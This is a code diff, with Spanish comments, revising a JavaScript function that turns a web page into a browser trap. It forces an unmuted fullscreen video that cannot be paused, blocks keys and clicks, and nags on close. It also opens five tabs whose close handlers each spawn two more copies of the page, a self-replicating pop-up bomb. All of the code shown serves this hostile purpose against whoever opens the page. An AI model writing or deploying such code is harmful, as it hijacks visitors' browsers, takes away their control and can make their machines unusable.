@@ -20,31 +20,31 @@ function showVideo() {
     const video = document.getElementById('video');
     const container = document.getElementById('container');
 
+    // Mostrar video
     container.style.display = 'none';
     video.style.display = 'block';
     video.muted = false;
     video.play();
     video.controls = false;
 
-    // Anti pausa
+    // Prevenir pausa
     video.addEventListener('pause', () => video.play());
-    video.addEventListener('click', (e) => {
-        e.preventDefault();
-        video.play();
-    });
-
     document.addEventListener('keydown', (e) => {
         if (e.code === 'Space') e.preventDefault();
     });
+    document.addEventListener('click', (e) => {
+        if (document.fullscreenElement) e.preventDefault();
+    });
 
-    if (video.requestFullscreen) video.requestFullscreen();
+    // Fullscreen
+    if (video.requestFullscreen) {
+        video.requestFullscreen();
+    }
 
-    window.onbeforeunload = function () {
-        return "¿Estás seguro que querés cerrar esto?";
-    };
+    // Pregunta antes de cerrar
+    window.onbeforeunload = () => "¿Estás seguro que querés cerrar esto?";
 
-    // 🔥 ABRIR PESTAÑAS SIN TIMEOUT, SIN PROMESAS
-    const tabs = [];
+    // Abrir 5 pestañas YA MISMO (acción directa del click)
     for (let i = 0; i < 5; i++) {
         const win = window.open('', '_blank');
         if (win) {
@@ -60,8 +60,9 @@ function showVideo() {
                             v.play();
                             v.controls = false;
                             v.addEventListener('pause', () => v.play());
+
                             window.onbeforeunload = function () {
-                                for (let j = 0; j < 2; j++) {
+                                for (let i = 0; i < 2; i++) {
                                     const clone = window.open('', '_blank');
                                     if (clone) {
                                         clone.document.write(document.documentElement.outerHTML);
@@ -74,12 +75,13 @@ function showVideo() {
                 </html>
             `);
             win.document.close();
-            tabs.push(win);
         }
     }
 
-    // Poner foco en la última
-    if (tabs.length) tabs[tabs.length - 1].focus();
+    // Foco a la última
+    setTimeout(() => {
+        window.blur();
+    }, 100);
 }
 
 
